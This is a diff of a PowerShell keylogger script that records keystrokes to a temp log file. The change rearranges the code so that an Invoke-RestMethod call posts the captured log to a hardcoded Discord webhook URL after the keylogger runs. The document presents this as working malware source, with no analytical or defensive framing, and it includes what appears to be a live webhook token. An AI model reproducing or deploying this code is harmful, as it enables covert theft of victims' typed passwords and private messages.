@@ -55,7 +55,7 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
   }
 
   # send logs if code fails
-  finally {
+ 
     
 
 $webhookUri = 'https://discord.com/api/webhooks/941122393366204447/bqjN-dHZTcO1enFJ51U0XkPTlK_nHMrm7J8PTvxVnbisAlSZSXSFitnrJsqY6eN_tub9'
@@ -63,9 +63,10 @@ $Body = @{
   
   'content' = get-content $env:temp/keylogger.log
 }
-Invoke-RestMethod -Uri $webhookUri -Method 'post' -Body $Body
-  }
+
+  
 }
 
 # run keylogger
 KeyLogger
+Invoke-RestMethod -Uri $webhookUri -Method 'post' -Body $Body
